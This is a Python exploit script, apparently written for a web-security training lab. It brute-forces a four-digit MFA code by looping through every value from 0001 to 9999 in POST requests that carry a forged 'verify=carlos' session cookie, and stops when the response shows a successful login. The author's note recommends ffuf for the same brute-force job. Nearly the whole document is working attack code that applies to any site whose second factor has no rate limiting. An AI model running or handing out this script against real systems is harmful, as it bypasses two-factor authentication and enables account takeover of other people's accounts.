"""
TBH I would never use Python to make 10000 request, but you have the script here anyway.
The way I would do it (I beleive it's the best way) is doing it using `ffuf`, 10000 requests with ffuf is handy. 
"""

import sys # Import sys to pass arguments
import requests # Import the requests module to send requests

if len(sys.argv) != 2 :
    print ("Usage : python3 exploit.py <URL>")
    exit()

url = sys.argv[1] # Pass the lab URL as an argument

def start():    
    # Set the headers for the request, including a cookie for session management
    header = {'Cookie': 'verify=carlos'}
    
    requests.get(url, headers=header) # Send a GET request to the second login page

    for i in range(1, 10000): # Loop through numbers from 1 to 9999
        
        i = str(i).zfill(4) # Pad the number with leading zeros to ensure it is 4 digits
        
        # Construct the data payload with the current code
        data = {'mfa-code': i}
        
        # Send a POST request
        with requests.post(url, data=data, headers=header) as req:
            response_content = req.text # Get the response content
        
        
        # Check if the response contains the success message 
        if 'Your username is:' in response_content:            
            print(f'Correct code!!: # {i} #')
            break
        else:
            print(f'Invalid code: {i}')

start() # Call the start function to begin the process
